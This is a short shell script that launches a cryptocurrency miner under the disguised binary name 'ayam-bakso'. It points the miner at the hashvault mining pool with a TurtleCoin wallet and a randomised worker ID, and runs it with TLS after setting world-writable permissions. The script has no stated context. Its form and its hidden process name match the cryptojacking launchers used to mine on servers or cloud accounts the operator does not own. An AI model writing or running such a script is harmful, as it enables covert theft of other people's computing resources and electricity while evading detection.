POL=pool.hashvault.pro:80
WAL=TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR
WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
chmod 777 ayam-bakso && ./ayam-bakso -o $POL -u $WAL --keepalive --donate-level 1 -p $WOR -k --tls